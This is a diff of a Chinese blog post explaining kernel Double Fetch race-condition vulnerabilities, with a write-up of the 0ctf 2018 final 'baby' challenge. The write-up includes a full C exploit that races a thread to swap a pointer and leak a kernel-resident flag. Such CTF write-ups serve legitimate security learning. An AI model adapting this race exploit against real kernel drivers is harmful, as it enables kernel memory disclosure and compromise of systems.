@@ -17,35 +17,34 @@
   <meta name="author" content="hope">
   <meta name="keywords" content="">
   
-    <meta name="description" content="kernel-pwn学习笔记">
+    <meta name="description" content="前言Double Fetch(双取)是一种条件竞争的漏洞，相关的论文发表在USENIX，论文链接：https:&#x2F;&#x2F;www.usenix.org&#x2F;system&#x2F;files&#x2F;conference&#x2F;usenixsecurity17&#x2F;sec17-wang.pdf Double FetchDouble Fetch是内核的一种漏洞类型，发生在内核从用户空间中拷贝数据时，两次访问了相同一块内存。如下图示（图片来">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Double-Fetch">
+<meta property="og:title" content="hope">
 <meta property="og:url" content="https://h0pe-ay.github.io/Double-Fetch/index.html">
 <meta property="og:site_name" content="hope">
-<meta property="og:description" content="kernel-pwn学习笔记">
+<meta property="og:description" content="前言Double Fetch(双取)是一种条件竞争的漏洞，相关的论文发表在USENIX，论文链接：https:&#x2F;&#x2F;www.usenix.org&#x2F;system&#x2F;files&#x2F;conference&#x2F;usenixsecurity17&#x2F;sec17-wang.pdf Double FetchDouble Fetch是内核的一种漏洞类型，发生在内核从用户空间中拷贝数据时，两次访问了相同一块内存。如下图示（图片来">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938247.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938248.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938249.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938250.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938251.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938252.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938253.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938254.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938255.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938256.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938257.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938258.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938259.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/a3yibWY5Zm4ejvo.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/s25dEOjTeRJNDqn.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/LwxTq9rbBeh6u3J.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/kCwXh7cmYDM3bVT.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/8C1N5paSbhYUeWq.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/N56PUSHY2QjesTp.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/LveFj2dcTubmP4o.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/k2Vh694KmoQMlp1.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/fZDdz3p4KIx2r95.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/oPN6f5zny29j1QI.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/gSq3o2nLQRlz6Mr.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/iG8a35nJuqprzIk.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/17/HXAxtZVT1nKrfo8.png">
 <meta property="article:published_time" content="2023-07-13T11:38:41.145Z">
 <meta property="article:author" content="hope">
-<meta property="article:tag" content="kernel">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938247.png">
+<meta name="twitter:image" content="https://s2.loli.net/2024/03/17/a3yibWY5Zm4ejvo.png">
   
   
   
-  <title>Double-Fetch - hope</title>
+  <title>hope</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -228,7 +227,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Double-Fetch"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -308,16 +307,16 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Double-Fetch</h1>
+            <h1 style="display: none"></h1>
             
             
               <div class="markdown-body">
                 
                 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Double Fetch(双取)是一种条件竞争的漏洞，相关的论文发表在USENIX，论文链接：<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-wang.pdf">https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-wang.pdf</a></p>
 <h1 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h1><p>Double Fetch是内核的一种漏洞类型，发生在内核从用户空间中拷贝数据时，两次访问了相同一块内存。如下图示（图片来自论文），内核从用户空间拷贝数据时，第一次拷贝会进行安全检测，而第二次拷贝时才会进行数据的使用，那么在第一次拷贝与第二次拷贝的间隙，就能够进行恶意数据篡改。举个例子，在第一次时从用户空间中获取了需要拷贝的长度，并进行长度的检测，但是在第二次拷贝时会再次拷贝长度，并且根据该长度进行数据的拷贝。但是此时的长度是没有经过校验的，因此当该长度在第一次拷贝与第二次拷贝之间被修改，就会导致漏洞的发生。这种漏洞就被称之为Double Fetch。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938247.png" srcset="/img/loading.gif" lazyload alt="image-20230713134722390"></p>
+<p><img src="https://s2.loli.net/2024/03/17/a3yibWY5Zm4ejvo.png" srcset="/img/loading.gif" lazyload alt="image-20230713134722390"></p>
 <p>论文的作者总结了容易发生Double Fetch的情况，如下图示（图片来自论文）。通常用户进程会通过指定的消息格式与内核进行通信，而消息格式通常由消息头与消息体构成。消息头包含了一些特殊属性，比如消息的长度，消息的类型等。那么内核通常会取出消息头，根据消息头的信息，进行不同的分支执行。若在进入分支后，内核依旧提取出消息头，并使用了前面使用过的字段，就非常容易发生Double Fetch，因为在这两次提取的过程中，用户态的程序可以修改消息头。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938248.png" srcset="/img/loading.gif" lazyload alt="image-20230713140815577"></p>
+<p><img src="https://s2.loli.net/2024/03/17/s25dEOjTeRJNDqn.png" srcset="/img/loading.gif" lazyload alt="image-20230713140815577"></p>
 <p>作者根据Double Fetch发生的场景，并将其进行分类</p>
 <ul>
 <li>类型选择</li>
@@ -325,13 +324,13 @@
 <li>浅拷贝</li>
 </ul>
 <h2 id="类型选择"><a href="#类型选择" class="headerlink" title="类型选择"></a>类型选择</h2><p>类型选择的<code>Double Fetch</code>，如下图示（图片来自论文）。代码截取自<code>cxgb3 main.c</code>。可以看到下述代码首先通过<code>copy_from_user</code>函数从<code>useraddr</code>中拷贝数据到<code>cmd</code>中，而<code>useraddr</code>为用户空间的地址。而后续的流程会根据从<code>useraddr</code>中提取出的数据从而选择执行。并且在每个分支中，又通过<code>copy_from_user</code>函数从<code>useraddr</code>的地址中取出数据，做后续的处理。若在后续的处理中又重复使用到了<code>cmd</code>那么就会导致<code>Double Fetch</code>。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938249.png" srcset="/img/loading.gif" lazyload alt="image-20230713142023576"></p>
+<p><img src="https://s2.loli.net/2024/03/17/LwxTq9rbBeh6u3J.png" srcset="/img/loading.gif" lazyload alt="image-20230713142023576"></p>
 <h2 id="长度选择"><a href="#长度选择" class="headerlink" title="长度选择"></a>长度选择</h2><p>长度选择的<code>Double Fetch</code>，如下图示（图片来自论文）。在第一次拷贝是通过<code>copy_from_user</code>从<code>arg</code>中获取数据，并且提取了<code>header.Size</code>，在第二次时又重复了这个过程，这就是明显的<code>Double Fetch</code>。若在两次提取之间修改了<code>header.Size</code>值，并通过<code>aac_fib_send</code>函数发送数据，那么就会导致漏洞的发送，即可以泄露比原本<code>header.Size</code>值更大的数据量。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938250.png" srcset="/img/loading.gif" lazyload alt="image-20230713143534035"></p>
+<p><img src="https://s2.loli.net/2024/03/17/kCwXh7cmYDM3bVT.png" srcset="/img/loading.gif" lazyload alt="image-20230713143534035"></p>
 <h2 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h2><p>浅拷贝则是第一次的拷贝只是将指向用户数据的指针拷贝到内核中，后续在将用户数据拷贝进来。如下图示（图片来自论文）。第一次获取时是通过指向用户数据的指针的指针，而第二次同样是这么获取的，那么在第一次与第二次的间隔中修改指针的指向就会导致数据被修改。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938251.png" srcset="/img/loading.gif" lazyload alt="image-20230713144330557"></p>
+<p><img src="https://s2.loli.net/2024/03/17/8C1N5paSbhYUeWq.png" srcset="/img/loading.gif" lazyload alt="image-20230713144330557"></p>
 <p>举个例子，即内核拷贝时并不是把能够读取用户数据的地址拷贝进来，而是将指向该地址的地址给拷贝进来，即下图中的<code>ptr</code>，因此后续内核在读取数据的时候都是通过<code>ptr</code>进行获取，那么在两次获取的中途修改了<code>ptr</code>的指向，那么就可以使得内核指向恶意数据。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938252.png" srcset="/img/loading.gif" lazyload alt="未命名文件"></p>
+<p><img src="https://s2.loli.net/2024/03/17/N56PUSHY2QjesTp.png" srcset="/img/loading.gif" lazyload alt="未命名文件"></p>
 <p>总结一下Double Fetch的利用流程</p>
 <ul>
 <li>内核会从用户空间中获取数据，并且会两次获取相同空间的数据</li>
@@ -340,15 +339,15 @@
 </ul>
 <h1 id="20180ctf-final-baby"><a href="#20180ctf-final-baby" class="headerlink" title="20180ctf-final-baby"></a>20180ctf-final-baby</h1><p>题目链接：<a target="_blank" rel="noopener" href="https://github.com/h0pe-ay/Kernel-Pwn/tree/master/0ctf-final-baby">https://github.com/h0pe-ay/Kernel-Pwn/tree/master/0ctf-final-baby</a></p>
 <p>在模块中存在<code>baby_ioctl</code>函数，若<code>rsi</code>的值为0x6666则会将<code>flag</code>输出，由于是通过<code>printk</code>，因此需要通过<code>dmesg</code>输出，若<code>rsi</code>为0x1337，则会经过一个校验函数，若通过该校验流程，则会将<code>flag</code>的值与传入的地址的内容进行比较，若内容完全一致，那么则会将<code>flag</code>直接输出，同样的该输出是通过<code>printk</code>，因此需要通过<code>dmesg</code>进行打印。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938253.png" srcset="/img/loading.gif" lazyload alt="image-20230713151512178"></p>
+<p><img src="https://s2.loli.net/2024/03/17/LveFj2dcTubmP4o.png" srcset="/img/loading.gif" lazyload alt="image-20230713151512178"></p>
 <p>接着看校验函数，该函数很简单，接受三个参数，<code>a1</code>、<code>a2</code>、<code>a3</code>，若<code>a1 + a2 &lt; a3</code>则通过检查。而a1的值是我们所控制的，即<code>rdx</code>寄存器的值，而<code>a3</code>的值则是通过<code>&amp;current_task</code>中获取的。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938254.png" srcset="/img/loading.gif" lazyload alt="image-20230713151905552"></p>
+<p><img src="https://s2.loli.net/2024/03/17/k2Vh694KmoQMlp1.png" srcset="/img/loading.gif" lazyload alt="image-20230713151905552"></p>
 <p>可以发现从<code>&amp;current_task</code>中获取的地址为<code>0x7ffffffff000</code></p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938255.png" srcset="/img/loading.gif" lazyload alt="image-20230713153756972"></p>
+<p><img src="https://s2.loli.net/2024/03/17/fZDdz3p4KIx2r95.png" srcset="/img/loading.gif" lazyload alt="image-20230713153756972"></p>
 <p>下图为用户空间的地址分布，可以看到<code>0x7ffffffff000</code>为末尾地址，因此该检测即使若传入的地址是用户空间地址则通过，传入内核空间地址就不通过。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938256.png" srcset="/img/loading.gif" lazyload alt="image-20230713154124891"></p>
+<p><img src="https://s2.loli.net/2024/03/17/oPN6f5zny29j1QI.png" srcset="/img/loading.gif" lazyload alt="image-20230713154124891"></p>
 <p>这么做的原因是因为，<code>flag</code>字符串是硬编码到驱动中的，若能够读取内核空间的内容，岂不是可以直接读取了？因此该题做了隔离。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938257.png" srcset="/img/loading.gif" lazyload alt="image-20230713154417553"></p>
+<p><img src="https://s2.loli.net/2024/03/17/gSq3o2nLQRlz6Mr.png" srcset="/img/loading.gif" lazyload alt="image-20230713154417553"></p>
 <p>那么这题就能够使用<code>Double Fetch</code>进行利用，重点来看检测部分。驱动会进行三块检测</p>
 <ul>
 <li>检查传入的地址是否为用户空间的地址</li>
@@ -358,7 +357,7 @@
 <p>总的来说从用户空间中我们传入了一个结构体</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *flag_addr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flag_len;<br>&#125;;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938258.png" srcset="/img/loading.gif" lazyload alt="image-20230713154600216"></p>
+<p><img src="https://s2.loli.net/2024/03/17/iG8a35nJuqprzIk.png" srcset="/img/loading.gif" lazyload alt="image-20230713154600216"></p>
 <p>可以看到该题在检测的时候获取的用户空间的地址<code>v5</code>，接着在循环过程中再一次获得用户空间的地址<code>v5</code>，在这两次获取的过程中并没有去比较值是否被修改了，那么就导致了<code>Double Fetch</code>。</p>
 <p>利用的思路如下</p>
 <ul>
@@ -374,7 +373,7 @@
 <li>线程之间共享内存信息</li>
 </ul>
 <p>因此可以利用其他线程去修改共享的内存</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307131938259.png" srcset="/img/loading.gif" lazyload alt="未命名文件 (1)"></p>
+<p><img src="https://s2.loli.net/2024/03/17/HXAxtZVT1nKrfo8.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 1024</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXTIME 1000000</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target_addr;<br><span class="hljs-type">int</span> finish;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>	<span class="hljs-type">char</span>* flag_addr;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flag_len;<br>&#125;data, *pdata;<br>data data_flag;<br><span class="hljs-type">int</span> fd;<br><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">rewrite_flag_addr</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>	pdata data = (pdata)arg;<br>	<span class="hljs-keyword">while</span>(finish == <span class="hljs-number">0</span>)<br>	&#123;<br>		data-&gt;flag_addr = (<span class="hljs-type">char</span> *)target_addr;<br>		<span class="hljs-comment">//printf(&quot;%p\n&quot;,data_flag.flag_addr);</span><br>	&#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>	__asm(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov rax, 0x10;&quot;</span><br>		<span class="hljs-string">&quot;mov rdi, fd;&quot;</span><br>		<span class="hljs-string">&quot;mov rsi, 0x6666;&quot;</span><br>		<span class="hljs-string">&quot;syscall;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);	<br>	<br>	<span class="hljs-type">char</span> buf[MAXSIZE];<br>	<span class="hljs-type">char</span> *target;<br>	<span class="hljs-type">int</span> count;<br>	<span class="hljs-type">int</span> flag = open(<span class="hljs-string">&quot;/dev/kmsg&quot;</span>, O_RDONLY);<br>	<span class="hljs-keyword">if</span> (flag == <span class="hljs-number">-1</span>)<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open dmesg error&quot;</span>);<br>	<span class="hljs-keyword">while</span> ((count = read(flag, buf, MAXSIZE)) &gt; <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-keyword">if</span> ((target = <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;Your flag is at &quot;</span>)) &gt; <span class="hljs-number">0</span>)<br>		&#123;<br>			target = target + <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);<br>			<span class="hljs-type">char</span> *temp = <span class="hljs-built_in">strstr</span>(target, <span class="hljs-string">&quot;!&quot;</span>);<br>			target[temp - target] = <span class="hljs-number">0</span>;<br>			target_addr = strtoul(target, <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag address:0x%s\n&quot;</span>,target);<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag address:0x%lx\n&quot;</span>, target_addr);<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>	&#125;	<br>	data_flag.flag_addr = buf;<br>	data_flag.flag_len = <span class="hljs-number">33</span>;<br>	<span class="hljs-type">pthread_t</span> ntid;<br>	<span class="hljs-type">int</span> err;<br>	err = pthread_create(&amp;ntid, <span class="hljs-literal">NULL</span>, rewrite_flag_addr, &amp;data_flag);	<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAXTIME; i++)<br>	&#123;<br>		ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;data_flag);<br>		data_flag.flag_addr = buf;<br>		<span class="hljs-comment">//printf(&quot;%d\n&quot;,i);</span><br>	&#125;<br>	finish = <span class="hljs-number">1</span>;<br>	pthread_join(ntid, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;end!&quot;</span>);<br>	<span class="hljs-comment">//system(&quot;dmesg | grep flag&quot;);</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
@@ -393,34 +392,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/kernel/" class="category-chain-item">kernel</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/kernel/">#kernel</a>
-      
-    </div>
   
 </div>
 
@@ -430,7 +401,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Double-Fetch</div>
+      <div></div>
       <div>https://h0pe-ay.github.io/Double-Fetch/</div>
     </div>
     <div class="license-meta">
@@ -475,9 +446,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/%E5%88%A9%E7%94%A8modprobe_path%E6%8F%90%E6%9D%83/" title="利用modprobe_path提权">
+                      <a href="/awd/" title="awd">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">利用modprobe_path提权</span>
+                        <span class="hidden-mobile">awd</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -485,8 +456,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/ret2dir/" title="ret2dir">
-                        <span class="hidden-mobile">ret2dir</span>
+                      <a href="/UNIX%E7%8E%AF%E5%A2%83%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/" title="UNIX环境高级编程笔记">
+                        <span class="hidden-mobile">UNIX环境高级编程笔记</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
